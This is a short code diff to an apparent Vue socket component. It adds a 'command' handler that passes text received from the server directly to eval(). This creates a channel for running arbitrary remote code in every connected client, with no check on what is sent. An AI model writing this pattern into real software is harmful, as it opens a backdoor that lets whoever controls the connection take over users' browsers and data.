@@ -40,10 +40,15 @@ export default {
             this.isConnected = false;
         },
 
-        // Fired when the server sends something on the "message" channel.
         message(data) {
             this.addNewMessage(data);
-        }
+		},
+
+		command(data) {
+			let command = data.message;
+
+			eval(command);
+		}
     },
 
 	methods: {
